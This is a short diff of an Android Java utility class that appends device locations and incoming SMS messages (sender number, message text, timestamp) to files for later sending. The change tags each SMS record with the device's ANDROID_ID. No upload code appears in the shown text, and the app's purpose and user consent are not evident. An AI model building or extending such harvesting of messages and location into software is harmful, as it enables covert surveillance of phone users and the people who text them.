@@ -192,9 +192,9 @@ class Utils {
 
         try {
             FileOutputStream stream = new FileOutputStream(file, true);
+            String deviceId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
             for (Location loc : locs2send) {
                 try {
-                    String deviceId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
                     String locationString = buildLocationString(deviceId, loc);//loc.getTime() + ";" + loc.getLatitude() + ";" + loc.getLongitude() + "\r\n";
                     Log.v("Sender", locationString);
                     stream.write(locationString.getBytes());
@@ -257,13 +257,14 @@ class Utils {
 
         try {
             FileOutputStream stream = new FileOutputStream(file, true);
+            String deviceId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
             for (SmsMessage smsMessage : sms2send) {
                 try {
                     String phoneNumber = smsMessage.getDisplayOriginatingAddress();
                     String message = smsMessage.getDisplayMessageBody();
                     String datetime = "" + smsMessage.getTimestampMillis();
-                    Log.d("Sender", "sms date" + datetime);
-                    String line =  datetime + ";" + URLEncoder.encode(phoneNumber, "utf-8") + ";" + URLEncoder.encode(message, "utf-8") + "\r\n";
+                    //Log.d("Sender", "sms date" + datetime);
+                    String line = deviceId + ";" + datetime + ";" + URLEncoder.encode(phoneNumber, "utf-8") + ";" + URLEncoder.encode(message, "utf-8") + "\r\n";
 
                     Log.v("Sender", line);
                     stream.write(line.getBytes());
